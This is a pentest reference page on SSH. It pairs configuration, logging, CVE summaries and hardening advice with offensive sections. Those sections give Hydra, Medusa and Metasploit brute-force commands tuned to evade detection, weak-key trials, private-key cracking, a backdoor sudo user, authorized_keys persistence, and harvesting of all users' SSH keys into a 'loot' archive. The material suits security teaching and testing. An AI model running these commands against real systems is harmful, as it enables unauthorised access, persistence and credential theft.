# SSH (Secure Shell)

!!! info "Information"
    **Category:** Authentication  
    **Tags:** 'ssh' 'remote-access' 'authentication' 'encryption' 'openssh' 'secure-shell'  
    **Criticality:** 🔴 High

## Description

SSH (Secure Shell) is a cryptographic network protocol used for secure communication over unsecured networks. Originally developed in 1995 by Tatu Ylönen as a replacement for insecure protocols like Telnet, rlogin, and rsh, SSH has become the de facto standard for remote system administration and secure file transfers.

SSH provides strong authentication and encrypted data communications between two computers connecting over an open network such as the internet. It is primarily used for remote command-line login, remote command execution, and secure file transfer (SFTP/SCP). SSH uses public-key cryptography to authenticate the remote computer and allow it to authenticate the user.

The most widely deployed implementation is OpenSSH, which is included by default in most Unix-like operating systems (Linux, macOS, BSD) and is available for Windows starting with Windows 10 version 1809 and Windows Server 2019. OpenSSH is maintained by the OpenBSD project and is free, open-source software.

SSH operates in a client-server model, where the SSH client initiates a connection to an SSH server (sshd daemon). The protocol supports multiple authentication methods including password authentication, public key authentication, host-based authentication, keyboard-interactive authentication, and GSSAPI authentication.

**Key features:**
- Strong encryption of all traffic (data, authentication credentials, commands)
- Public key authentication eliminating password transmission
- Port forwarding (local, remote, and dynamic/SOCKS proxy)
- X11 forwarding for graphical applications
- SFTP and SCP for secure file transfer
- Agent forwarding for seamless multi-hop connections
- Tunneling and VPN capabilities
- Strong host authentication preventing man-in-the-middle attacks

**Current versions:**
- OpenSSH 9.9p2 (latest stable as of January 2025)
- OpenSSH 9.8p1
- Legacy versions still deployed: 7.x, 6.x, 5.x (deprecated, vulnerable)

SSH is ubiquitous in IT infrastructure, used by system administrators, developers, DevOps engineers, security professionals, and automated systems for configuration management, deployment, monitoring, and remote access.

---

## Configuration Files

=== "Linux (Debian/Ubuntu)"
    ```bash
    # Server configuration
    /etc/ssh/sshd_config
    /etc/ssh/sshd_config.d/*.conf
    
    # Client configuration (system-wide)
    /etc/ssh/ssh_config
    /etc/ssh/ssh_config.d/*.conf
    
    # User client configuration
    ~/.ssh/config
    
    # Host keys (server identity)
    /etc/ssh/ssh_host_rsa_key
    /etc/ssh/ssh_host_rsa_key.pub
    /etc/ssh/ssh_host_ecdsa_key
    /etc/ssh/ssh_host_ecdsa_key.pub
    /etc/ssh/ssh_host_ed25519_key
    /etc/ssh/ssh_host_ed25519_key.pub
    
    # Moduli (Diffie-Hellman parameters)
    /etc/ssh/moduli
    ```

=== "Linux (RedHat/CentOS/Fedora)"
    ```bash
    # Server configuration
    /etc/ssh/sshd_config
    /etc/ssh/sshd_config.d/*.conf
    
    # Client configuration (system-wide)
    /etc/ssh/ssh_config
    /etc/ssh/ssh_config.d/*.conf
    
    # User client configuration
    ~/.ssh/config
    
    # Host keys
    /etc/ssh/ssh_host_*_key
    /etc/ssh/ssh_host_*_key.pub
    ```

=== "Windows"
    ```powershell
    # OpenSSH Server configuration
    %ProgramData%\ssh\sshd_config
    
    # OpenSSH Client configuration (system-wide)
    %ProgramData%\ssh\ssh_config
    
    # User client configuration
    %USERPROFILE%\.ssh\config
    
    # Host keys
    %ProgramData%\ssh\ssh_host_*_key
    %ProgramData%\ssh\ssh_host_*_key.pub
    
    # Default shell configuration
    Computer\HKEY_LOCAL_MACHINE\SOFTWARE\OpenSSH\DefaultShell
    ```

=== "macOS"
    ```bash
    # Server configuration
    /etc/ssh/sshd_config
    /etc/ssh/sshd_config.d/*.conf
    
    # Client configuration
    /etc/ssh/ssh_config
    /etc/ssh/ssh_config.d/*.conf
    
    # User client configuration
    ~/.ssh/config
    
    # Host keys
    /etc/ssh/ssh_host_*_key
    /etc/ssh/ssh_host_*_key.pub
    ```

=== "FreeBSD"
    ```bash
    # Server configuration
    /etc/ssh/sshd_config
    
    # Client configuration
    /etc/ssh/ssh_config
    
    # User client configuration
    ~/.ssh/config
    ```

---

## Log Files

```bash
# Debian/Ubuntu - Authentication logs
/var/log/auth.log
journalctl -u ssh
journalctl -u sshd

# RedHat/CentOS/Fedora - Secure logs
/var/log/secure
journalctl -u sshd

# macOS
/var/log/system.log
log show --predicate 'process == "sshd"' --last 1h

# Windows
# Event Viewer: Applications and Services Logs > OpenSSH > Operational
Get-WinEvent -LogName "OpenSSH/Operational"

# FreeBSD
/var/log/auth.log

# Generic systemd-based systems
journalctl -u ssh.service
journalctl -u sshd.service
journalctl -t sshd

# View real-time SSH logs
tail -f /var/log/auth.log | grep sshd
journalctl -u sshd -f

# Failed login attempts
grep "Failed password" /var/log/auth.log
grep "Failed publickey" /var/log/auth.log

# Successful logins
grep "Accepted password" /var/log/auth.log
grep "Accepted publickey" /var/log/auth.log

# Last login information
last
lastlog
lastb  # Failed login attempts
```

---

## Sensitive Files

!!! danger "Credentials and sensitive data"
    The following files may contain critical information:
    
    - **Private keys (client-side):**
        - `~/.ssh/id_rsa` - RSA private key
        - `~/.ssh/id_ecdsa` - ECDSA private key
        - `~/.ssh/id_ed25519` - Ed25519 private key (recommended)
        - `~/.ssh/id_dsa` - DSA private key (deprecated, weak)
    
    - **Public keys (client-side):**
        - `~/.ssh/id_rsa.pub`
        - `~/.ssh/id_ecdsa.pub`
        - `~/.ssh/id_ed25519.pub`
    
    - **Server host keys (server-side):**
        - `/etc/ssh/ssh_host_*_key` - Server private keys
        - `/etc/ssh/ssh_host_*_key.pub` - Server public keys
    
    - **Authorization and authentication:**
        - `~/.ssh/authorized_keys` - Public keys authorized to login
        - `~/.ssh/known_hosts` - Fingerprints of known servers
        - `/etc/ssh/ssh_known_hosts` - System-wide known hosts
    
    - **Configuration with sensitive data:**
        - `~/.ssh/config` - May contain proxy commands, jump hosts
        - `/etc/ssh/sshd_config` - Server configuration, AllowUsers, DenyUsers
        - `/etc/ssh/ssh_config` - System-wide client configuration
    
    - **Other sensitive files:**
        - `~/.ssh/environment` - Environment variables (if PermitUserEnvironment is yes)
        - `~/.ssh/rc` - Commands executed at login
        - `/etc/ssh/sshrc` - System-wide rc file

!!! warning "Backup files"
    Don't forget to check for backups and swap files:
    
    - `~/.ssh/id_rsa~`
    - `~/.ssh/id_rsa.bak`
    - `~/.ssh/config~`
    - `~/.ssh/config.swp`
    - `/etc/ssh/sshd_config~`
    - `/etc/ssh/sshd_config.bak`
    - `/etc/ssh/sshd_config.old`
    - `*.pem.bak`
    - Weak Debian SSH keys: `https://github.com/g0tmi1k/debian-ssh`

---

## Data Directories

```bash
# User SSH directory (CRITICAL: Check permissions!)
~/.ssh/
# Should be: drwx------ (700)

# System-wide SSH directory
/etc/ssh/

# OpenSSH runtime files
/var/run/sshd/
/run/sshd/

# Windows OpenSSH directories
%ProgramData%\ssh\
%USERPROFILE%\.ssh\

# SSH agent socket (Unix domain socket)
/tmp/ssh-*/
$SSH_AUTH_SOCK

# SFTP chroot directories (if configured)
/var/sftp/
/home/*/sftp/
```

---

## Pentest Tips

!!! tip "Reconnaissance"
    **Version identification:**
    ```bash
    # Banner grabbing with nc
    nc target.com 22
    # Press Enter to see banner
    # Example: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
    
    # Banner grabbing with telnet
    telnet target.com 22
    
    # Banner grabbing with ssh client
    ssh -v target.com
    ssh -vv target.com  # More verbose
    
    # Nmap service detection
    nmap -p 22 -sV target.com
    nmap -p 22 -sV --script ssh-hostkey,ssh2-enum-algos target.com
    
    # Advanced SSH fingerprinting
    nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" target.com
    nmap -p 22 --script ssh-publickey-acceptance target.com
    
    # Check supported algorithms
    ssh -Q cipher target.com
    ssh -Q kex target.com
    ssh -Q mac target.com
    
    # Get host key fingerprint
    ssh-keyscan target.com
    ssh-keyscan -t rsa target.com
    ssh-keyscan -t ed25519 target.com
    ```
    
    **Default port:**
    - SSH: 22 (TCP)
    - Common alternate ports: 2222, 2200, 22000, 2022
    
    **Shodan queries:**
    ```
    port:22 openssh
    "SSH-2.0-OpenSSH" port:22
    openssh 7.4
    openssh product:OpenSSH
    port:22 country:US city:"New York"
    ```

!!! tip "Enumeration"
    **User enumeration (timing attack - CVE-2018-15473):**
    ```bash
    # Metasploit module for user enumeration
    use auxiliary/scanner/ssh/ssh_enumusers
    set RHOSTS target.com
    set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
    run
    
    # Python script
    python ssh-user-enum.py --port 22 --userList users.txt target.com
    
    # Note: Fixed in OpenSSH 7.7 and later
    # Timing differences can reveal valid usernames
    ```
    
    **Authentication methods enumeration:**
    ```bash
    # Check what auth methods are available
    ssh -v target.com
    # Look for: "Authentications that can continue: publickey,password"
    
    # Nmap script
    nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" target.com
    
    # Test specific user
    ssh -o PreferredAuthentications=none testuser@target.com
    ```
    
    **Enumerate SSH keys on the system:**
    ```bash
    # Find SSH private keys
    find / -name "id_rsa" 2>/dev/null
    find / -name "id_dsa" 2>/dev/null
    find / -name "id_ecdsa" 2>/dev/null
    find / -name "id_ed25519" 2>/dev/null
    find / -name "*.pem" 2>/dev/null
    
    # Find authorized_keys files
    find / -name "authorized_keys" 2>/dev/null
    
    # Check for weak Debian keys
    # Download from: https://github.com/g0tmi1k/debian-ssh
    # Or use: https://github.com/rapid7/ssh-badkeys
    ```
    
    **Common misconfigurations to check:**
    - Password authentication enabled (PasswordAuthentication yes)
    - Root login permitted (PermitRootLogin yes)
    - Empty passwords allowed (PermitEmptyPasswords yes)
    - Weak ciphers/MACs/KexAlgorithms enabled
    - X11 forwarding enabled unnecessarily
    - Agent forwarding enabled without restrictions
    - Outdated OpenSSH version with known vulnerabilities
    - Default SSH keys (AWS, Docker, Vagrant, etc.)
    - Weak file permissions on ~/.ssh/ or authorized_keys

!!! tip "Exploitation"
    **Password brute-forcing:**
    ```bash
    # Hydra
    hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com
    hydra -L users.txt -P passwords.txt ssh://target.com -t 4
    hydra -l admin -P passwords.txt target.com ssh -s 2222
    
    # Medusa
    medusa -h target.com -u root -P /usr/share/wordlists/rockyou.txt -M ssh
    medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh -t 4
    
    # Ncrack
    ncrack -p 22 --user root -P passwords.txt target.com
    
    # Metasploit
    use auxiliary/scanner/ssh/ssh_login
    set RHOSTS target.com
    set USERNAME root
    set PASS_FILE /usr/share/wordlists/rockyou.txt
    set THREADS 4
    run
    
    # Note: Use low thread count (-t 1 or -t 4) to avoid account lockouts
    # and to prevent triggering intrusion detection systems
    ```
    
    **SSH key brute-forcing:**
    ```bash
    # Test known weak keys
    # Debian weak keys
    git clone https://github.com/g0tmi1k/debian-ssh.git
    for key in debian-ssh/common_keys/*; do
        ssh -i $key user@target.com
    done
    
    # rapid7 bad keys
    git clone https://github.com/rapid7/ssh-badkeys.git
    
    # Nmap script to test public key acceptance
    nmap -p 22 --script ssh-publickey-acceptance \
         --script-args="ssh.publickey=/path/to/key.pub" target.com
    
    # Python tool for key brute-forcing
    # https://github.com/snowdroppe/ssh-keybrute
    python3 ssh-keybrute.py -h target.com -u user -d /path/to/keys/
    ```
    
    **Private key cracking:**
    ```bash
    # Convert SSH private key to john format
    /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
    
    # Crack with John the Ripper
    john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
    
    # Show cracked password
    john --show id_rsa.hash
    ```
    
    **Default credentials:**
    ```bash
    # Common default usernames
    root, admin, administrator, user, test, guest, ubuntu, centos, ec2-user
    
    # Cloud provider defaults
    # AWS EC2: ec2-user, ubuntu, admin
    # Google Cloud: google, username from metadata
    # Azure: azureuser
    # DigitalOcean: root
    
    # IoT/Embedded defaults
    # Raspberry Pi: pi:raspberry
    # Ubiquiti: ubnt:ubnt
    # Cisco: cisco:cisco
    # Many devices: admin:admin, root:root
    ```

!!! tip "Post-Exploitation"
    **Persistence mechanisms:**
    ```bash
    # Add your public key to authorized_keys
    echo "your-public-key-here" >> ~/.ssh/authorized_keys
    chmod 600 ~/.ssh/authorized_keys
    
    # Add backdoor user
    useradd -m -s /bin/bash backdoor
    echo "backdoor:P@ssw0rd" | chpasswd
    echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
    
    # Modify sshd_config for persistence
    echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
    systemctl restart sshd
    
    # Add SSH key to root account
    mkdir -p /root/.ssh
    echo "your-public-key" >> /root/.ssh/authorized_keys
    chmod 700 /root/.ssh
    chmod 600 /root/.ssh/authorized_keys
    ```
    
    **Credential harvesting:**
    ```bash
    # Find SSH private keys
    find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
    
    # Find authorized_keys to see which keys are trusted
    find / -name "authorized_keys" 2>/dev/null
    
    # Read SSH configuration for clues
    cat ~/.ssh/config
    cat /etc/ssh/sshd_config
    
    # Check known_hosts for pivot targets
    cat ~/.ssh/known_hosts
    
    # Look for passwords in bash history
    grep -i "ssh.*@" ~/.bash_history
    grep -i "scp.*@" ~/.bash_history
    ```
    
    **Pivoting and lateral movement:**
    ```bash
    # Local port forwarding (access internal service)
    ssh -L 8080:internal-server:80 user@jump-host
    # Now access http://localhost:8080
    
    # Remote port forwarding (expose your service to target network)
    ssh -R 9000:localhost:3000 user@target
    # Target can now access your port 3000 via their localhost:9000
    
    # Dynamic port forwarding (SOCKS proxy)
    ssh -D 9050 user@target
    # Configure browser/tools to use SOCKS5 proxy localhost:9050
    
    # ProxyJump / Jump Host (OpenSSH 7.3+)
    ssh -J jumphost targethost
    ssh -J user1@jump1,user2@jump2 user3@target
    
    # Agent forwarding (use local keys on remote host)
    ssh -A user@target
    # WARNING: Dangerous if remote host is compromised!
    ```

---

## Useful Commands

```bash
# Start/Stop/Restart SSH server
systemctl start sshd
systemctl stop sshd
systemctl restart sshd
systemctl reload sshd
systemctl status sshd

# Enable/Disable SSH at boot
systemctl enable sshd
systemctl disable sshd

# Test SSH configuration
sshd -t
sshd -T  # Show full effective configuration

# SSH client connection
ssh user@hostname
ssh user@192.168.1.100
ssh -p 2222 user@hostname  # Custom port
ssh -i ~/.ssh/id_rsa user@hostname  # Specify key

# Generate SSH keys
ssh-keygen  # Default: RSA 3072-bit
ssh-keygen -t ed25519  # Recommended: Ed25519
ssh-keygen -t rsa -b 4096  # RSA 4096-bit
ssh-keygen -t ecdsa -b 521  # ECDSA 521-bit

# Copy public key to remote server
ssh-copy-id user@hostname
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@hostname

# SSH with verbose output (debugging)
ssh -v user@hostname
ssh -vv user@hostname
ssh -vvv user@hostname

# Execute remote command
ssh user@hostname 'ls -la /tmp'
ssh user@hostname 'sudo systemctl status nginx'

# Check SSH server listening ports
ss -tlnp | grep ssh
netstat -tlnp | grep sshd
lsof -i :22

# View active SSH sessions
who
w
last
lastlog

# Monitor SSH logs in real-time
tail -f /var/log/auth.log | grep sshd
journalctl -u sshd -f

# Find failed login attempts
grep "Failed password" /var/log/auth.log
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr

# Check SSH file permissions
ls -la ~/.ssh/

# Fix SSH permissions
chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_*
chmod 644 ~/.ssh/id_*.pub
chmod 600 ~/.ssh/authorized_keys
chmod 644 ~/.ssh/known_hosts
chmod 644 ~/.ssh/config

# Get SSH server version
ssh -V
sshd -V

# List SSH keys in agent
ssh-add -l
ssh-add -L

# Add key to agent
ssh-add ~/.ssh/id_ed25519
eval "$(ssh-agent -s)"

# Audit SSH configuration
git clone https://github.com/jtesta/ssh-audit.git
python3 ssh-audit.py target.com
```

---

## Known Vulnerabilities

??? danger "CVE-2025-26465 - Man-in-the-Middle Attack via VerifyHostKeyDNS"
    MitM vulnerability when VerifyHostKeyDNS option is enabled.
    
    **Affected versions:** OpenSSH client 6.8p1 - 9.9p1  
    **Severity:** Medium (CVSS 6.8)  
    **Fixed in:** OpenSSH 9.9p2 (February 2025)  
    **Impact:** Allows MitM attacks by bypassing host key verification

??? danger "CVE-2025-26466 - Pre-Authentication Denial of Service"
    DoS via SSH2_MSG_PING packets causing excessive memory/CPU consumption.
    
    **Affected versions:** OpenSSH 9.5p1 - 9.9p1  
    **Severity:** Medium (CVSS 6.8)  
    **Fixed in:** OpenSSH 9.9p2 (February 2025)  
    **Impact:** Pre-authentication DoS attack

??? danger "CVE-2024-6387 - regreSSHion: Signal Handler Race Condition RCE"
    Critical race condition allowing remote unauthenticated RCE as root.
    
    **Affected versions:** OpenSSH < 4.4p1, 8.5p1 - 9.7p1  
    **Severity:** Critical (CVSS 8.1)  
    **Fixed in:** OpenSSH 9.8p1 (July 2024)  
    **Impact:** Remote code execution as root on glibc-based Linux

??? danger "CVE-2024-3094 - XZ Backdoor (Supply Chain Attack)"
    Sophisticated backdoor via compromised XZ Utils library.
    
    **Affected versions:** Systems using XZ Utils 5.6.0 or 5.6.1  
    **Severity:** Critical (CVSS 10.0)  
    **Discovered:** March 2024  
    **Impact:** RCE during SSH authentication via compromised liblzma

??? danger "CVE-2018-15473 - Username Enumeration via Timing"
    Username enumeration via timing side-channel.
    
    **Affected versions:** OpenSSH < 7.7  
    **Severity:** Medium (CVSS 5.3)  
    **Fixed in:** OpenSSH 7.7+  
    **Impact:** Remote username enumeration

??? danger "CVE-2016-0777 / CVE-2016-0778 - Information Disclosure"
    Client vulnerability allowing private key leakage.
    
    **Affected versions:** OpenSSH client 5.4 - 7.1  
    **Severity:** High  
    **Fixed in:** OpenSSH 7.1p2 (January 2016)  
    **Impact:** Private key leakage, memory disclosure

---

## Hardening

!!! success "Best practices"
    **1. Disable root login:**
    ```bash
    # In /etc/ssh/sshd_config
    PermitRootLogin no
    ```
    
    **2. Use SSH key authentication only:**
    ```bash
    PasswordAuthentication no
    PubkeyAuthentication yes
    ```
    
    **3. Use strong encryption algorithms:**
    ```bash
    Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com
    MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
    KexAlgorithms curve25519-sha256,diffie-hellman-group16-sha512
    ```
    
    **4. Restrict user access:**
    ```bash
    AllowUsers alice bob
    AllowGroups sshusers
    ```
    
    **5. Limit authentication attempts:**
    ```bash
    MaxAuthTries 3
    MaxStartups 3:50:10
    LoginGraceTime 60
    ```
    
    **6. Configure idle timeout:**
    ```bash
    ClientAliveInterval 300
    ClientAliveCountMax 2
    ```
    
    **7. Disable unnecessary features:**
    ```bash
    X11Forwarding no
    AllowAgentForwarding no
    AllowTcpForwarding no
    PermitUserEnvironment no
    ```
    
    **8. Implement fail2ban:**
    ```bash
    apt install fail2ban
    # Configure /etc/fail2ban/jail.local
    ```
    
    - Keep SSH regularly updated
    - Use strong authentication methods
    - Monitor logs for suspicious activity
    - Implement network-level access controls
    - Regular security audits with ssh-audit
    - Follow CIS Benchmarks for SSH hardening

---

## References

- [Official OpenSSH Documentation](https://www.openssh.com/)
- [OpenSSH Security Advisories](https://www.openssh.com/security.html)
- [CIS Benchmark - Distribution Independent Linux](https://www.cisecurity.org/benchmark/distribution_independent_linux)
- [ssh-audit - SSH server auditing tool](https://github.com/jtesta/ssh-audit)
- [OpenSSH Manual Pages](https://man.openbsd.org/ssh)
- [Qualys SSH Vulnerability Research](https://blog.qualys.com/vulnerabilities-threat-research)

---

## Exploitation Examples

??? example "Example 1: Password Brute-Force Attack"
    ```bash
    # Create username and password wordlists
    echo -e "root\nadmin\nubuntu" > users.txt
    
    # Use Hydra with small thread count
    hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
          ssh://192.168.1.100 -t 4 -V
    
    # Expected output:
    # [22][ssh] host: 192.168.1.100   login: root   password: toor
    ```

??? example "Example 2: User Enumeration"
    ```bash
    # Using Metasploit
    use auxiliary/scanner/ssh/ssh_enumusers
    set RHOSTS 192.168.1.100
    set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
    run
    
    # Expected output:
    # [+] 192.168.1.100:22 - SSH - User 'root' found
    # [+] 192.168.1.100:22 - SSH - User 'admin' found
    ```

??? example "Example 3: SSH Key Exploitation"
    ```bash
    # Download known weak Debian SSH keys
    git clone https://github.com/g0tmi1k/debian-ssh.git
    cd debian-ssh
    tar -xjf common_keys/debian_ssh_rsa_2048_x86.tar.bz2
    
    # Try each key against target
    for key in rsa/2048/*.key; do
        ssh -i $key user@192.168.1.100 "whoami" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "[+] Valid key: $key"
            break
        fi
    done
    ```

??? example "Example 4: Pivoting Through SSH"
    ```bash
    # Local port forwarding
    ssh -L 8080:internal-server:80 user@jump-host.com
    
    # Dynamic SOCKS proxy
    ssh -D 9050 user@jump-host.com
    proxychains nmap -sT 10.0.0.0/24
    
    # ProxyJump
    ssh -J user@jump-host.com internal-target
    ```

??? example "Example 5: Persistence via Authorized Keys"
    ```bash
    # Generate attacker's SSH key
    ssh-keygen -t ed25519 -f ~/.ssh/backdoor -N ""
    
    # Add public key to target
    echo "ssh-ed25519 AAAAC3NzaC1..." >> ~/.ssh/authorized_keys
    
    # Access from attacker machine
    ssh -i ~/.ssh/backdoor user@target
    ```

??? example "Example 6: Cracking Private Key"
    ```bash
    # Convert to John format
    /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
    
    # Crack with wordlist
    john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
    
    # Show cracked password
    john --show id_rsa.hash
    ```

??? example "Example 7: Credential Harvesting"
    ```bash
    # Find all private keys
    find / -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
    
    # Find authorized_keys
    find / -name "authorized_keys" 2>/dev/null
    
    # Search bash history
    grep -E "ssh.*@|password" ~/.bash_history
    
    # Exfiltrate found keys
    tar czf /tmp/ssh_loot.tar.gz /home/*/.ssh/ /root/.ssh/ 2>/dev/null
    ```

---

## Metadata

- **Template version:** 1.0
- **Last updated:** January 2026
- **Contributor:** Laurince AGANI / Epihack Bénin
- **Sources verified:** Yes